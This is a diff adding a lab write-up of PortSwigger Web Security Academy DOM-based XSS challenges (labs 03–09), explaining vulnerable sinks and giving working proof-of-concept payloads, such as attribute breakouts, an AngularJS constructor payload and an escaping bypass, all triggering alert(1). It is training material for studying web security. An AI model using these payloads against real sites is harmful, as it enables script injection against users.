@@ -70,29 +70,181 @@ The comment section in blog posts allow us to inject any special characters with
 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink
 
+In this lab, we observe how injecting arbitray user input into the *Document Object Model (DOM)* can lead to XSS. This class of attack is called DOM-based XSS.
+
+The following JavaScript function will take the input from the `location.search` source (user data in the `search` parameter) and will inject it to the `document.write` sink:
+
+```
+function trackSearch(query) {
+	document.write('<img src="/resources/images/tracker.gif?searchTerms='+query+'">');
+}
+var query = (new URLSearchParams(window.location.search)).get('search');
+if(query) {
+	trackSearch(query);
+}
+```
+
+As an attacker, we just need to escape from the enclosing double-quote `"` and inject our XSS payload. For example, here we can use the `onload` event inside the `<img>` and trigger an alert.
+
+**Solution**
+
+```
+" onload=alert(1) "
+```
+
 ### Lab 04 - DOM XSS in document.write sink using source location.search inside a select element
 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-document-write-sink-inside-select-element
+
+This lab is similar to the DOM XSS presented in [lab 03](#lab-03---dom-xss-in-documentwrite-sink-using-source-locationsearch). The user input will be injected to a `document.write` sink without any sanitization.
+
+Our payload will be written to the DOM as follows: `<option selected>**PAYLOAD**</option>`
+```
+var stores = ["London","Paris","Milan"];
+var store = (new URLSearchParams(window.location.search)).get('storeId');
+document.write('<select name="storeId">');
+if(store) {
+	document.write('<option selected>'+store+'</option>');
+}
+for(var i=0;i<stores.length;i++) {
+	if(stores[i] === store) {
+		continue;
+	}
+	document.write('<option>'+stores[i]+'</option>');
+}
+document.write('</select>');
+```
+
+**Solution**
+
+```
+<script>alert(1)</script>
+```
 
 ### Lab 05 - DOM XSS in innerHTML sink using source location.search
 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink
 
+This lab is similar to the DOM XSS presented in [lab 03](#lab-03---dom-xss-in-documentwrite-sink-using-source-locationsearch). The user input will be injected to a `innerHTML` sink instead.
+
+**Solution**
+
+```
+<svg/onload=alert`1`>
+```
+
 ### Lab 06 - DOM XSS in jQuery anchor href attribute sink using location.search source
 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-jquery-href-attribute-sink
+
+Using JavaScript library such as jQuery can introduce other types of potentially vulnerable sinks. In this lab, we see that the following function will alter the DOM by passing the contents of the `returnPath` parameter to the `attr()` function/sink.
+
+```
+<script>
+$(function() {
+	$('#backLink').attr("href", (new URLSearchParams(window.location.search)).get('returnPath'));
+});
+</script>
+```
+
+Here are some other example of sinks that can be used to trigger DOM XSS:
+
+The following jQuery functions are also sinks that can lead to DOM-XSS vulnerabilities:
+
+```
+add()
+after()
+append()
+animate()
+insertAfter()
+insertBefore()
+before()
+html()
+prepend()
+replaceAll()
+replaceWith()
+wrap()
+wrapInner()
+wrapAll()
+has()
+constructor()
+init()
+index()
+jQuery.parseHTML()
+$.parseHTML()
+```
+**Solution**
+
+```
+javascript:alert(1)
+```
 
 ### Lab 07 - DOM XSS in AngularJS expression with angle brackets and double quotes HTML-encoded
 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-angularjs-expression
 
+Another popular JavaScript framework commonly seen in modern webapps is Angular. One useful technique to know with Angular-enabled applications, is that it allows to trigger XSS without the need of angle brackets.
+
+Angular searches for the `ng-app` attribute (called a "directive") in the HTML source. When a directive is added to the HTML code, you can execute JavaScript expressions within double curly braces.
+
+*Note: the library also introduces a **sandboxing** mechanism which protects from evaluate unsafe JavaScript expressions. Exploitation will depend on the Angular version, more on that in an another lab further down*
+
+**Solution**
+
+```
+{{constructor.constructor('alert(1)')()}}
+```
+
 ### Lab 08 - Reflected DOM XSS
 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-reflected
 
+In this lab, the server processes our user input from the request, and echoes it data into the response. We identify the vulnerable sink `eval()` and place a breakpoint try and understand the flow.
+
+For now, we will use a dummy parameter value `?search=placeholder`. Our input is reflected as part of a JSON object in `responseText`:
+```
+{
+  "results":[],
+  "searchTerm":"placeholder"
+}
+```
+
+To trigger our XSS, we will need to escape from the string context and inject our payload. At first , we notice that the application automatically escapes any extra quotes by pre-pending an escape character `\`.
+
+However, it fails to escape the escaping character itself  - therefore we can nullify its effect and inject our payload.
+
+**Solution**
+
+```
+\\"-alert(1)}//
+```
+
 ### Lab 09 - Stored DOM XSS
 
 https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-dom-xss-stored
+
+In this lab we see an example of an insecure way to sanitize user input in an attempt to prevent DOM XSS. The input sanitization function apples the `escapeHTML()` function to user data before injecting in the DOM.
+
+```
+function escapeHTML(html) {
+	return html.replace('<', '&lt;').replace('>', '&gt;');
+}
+```
+
+As we can see in the `replace()` documentation:
+
+> The replace() method searches a string for a specified value, or a regular expression, and returns a new string where the specified values are replaced.
+> Note: If you are replacing a value (and not a regular expression), **only the first instance** of the value will be replaced.
+
+*- https://www.w3schools.com/jsref/jsref_replace.asp*
+
+Therefore, only the first encountered `<>` characters will be encoded.
+
+**Solution**
+
+```
+<><img src=x onerror=alert()>
+```
 
 ### Lab 10 - Exploiting cross-site scripting to steal cookies
 
